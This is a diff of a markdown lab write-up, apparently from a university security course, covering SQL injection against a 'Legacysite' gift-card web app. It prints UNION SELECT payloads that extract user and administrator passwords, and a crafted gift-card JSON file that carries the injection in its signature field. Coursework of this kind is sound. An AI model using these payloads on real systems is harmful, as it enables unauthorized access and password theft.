@@ -152,21 +152,21 @@ a statement that could work is a UNION SELECT since our data needs to be appende
 we try 
 ```
 'UNION SELECT password FROM Legacysite_user WHERE username='johnbg' --
-
 ```
 <img width="1131" alt="Screen Shot 2022-03-20 at 10 51 02 PM" src="https://user-images.githubusercontent.com/72175659/159199263-39ddb2fe-8c9c-4d49-beb6-2b44935ee4d9.png">
 <img width="1133" alt="Screen Shot 2022-03-20 at 10 51 14 PM" src="https://user-images.githubusercontent.com/72175659/159199265-c25beb03-8d25-4aed-a3d3-df05fef1e137.png">
+
 We find the password data in the output 
 
 we try 
 ```
 'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --
-
 ```
 <img width="1143" alt="Screen Shot 2022-03-20 at 10 55 20 PM" src="https://user-images.githubusercontent.com/72175659/159199507-31505b32-2043-48c9-b439-e432dde546e0.png">
+
 the following payload is in our jbg469-sqli.gftcrd file
-```
-{"merchant_id": "NYU Apparel Card", "customer_id": "gullible_user", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
+
+```{"merchant_id": "NYU Apparel Card", "customer_id": "johnbg", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
 ```
 
 
